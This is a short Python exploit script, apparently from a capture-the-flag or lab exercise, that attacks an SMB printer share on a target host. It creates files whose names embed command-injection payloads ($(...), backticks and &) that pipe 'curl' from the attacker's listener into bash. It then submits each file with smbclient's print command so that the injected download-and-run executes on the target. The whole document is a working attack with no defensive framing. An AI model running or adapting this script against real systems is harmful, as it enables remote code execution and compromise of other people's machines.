import os
import subprocess
import time

LHOST = "10.10.14.180"
PORT = "8000"
TARGET = "10.129.244.177"
SHARE = "HP-Reception"
D = "/tmp/print_inj_test6"
os.makedirs(D, exist_ok=True)

names = [
    f"b$(curl {LHOST}:{PORT}|bash).txt",
    f"b`curl {LHOST}:{PORT}|bash`.txt",
    f"b&curl {LHOST}:{PORT}|bash&.txt",
]

for n in names:
    p = os.path.join(D, n)
    with open(p, "wb") as f:
        f.write(b"x")
    cmd = ["smbclient", "-N", f"//{TARGET}/{SHARE}", "-c", f'print "{p}"']
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    print(n, "->", r.stderr.strip())
    time.sleep(2)
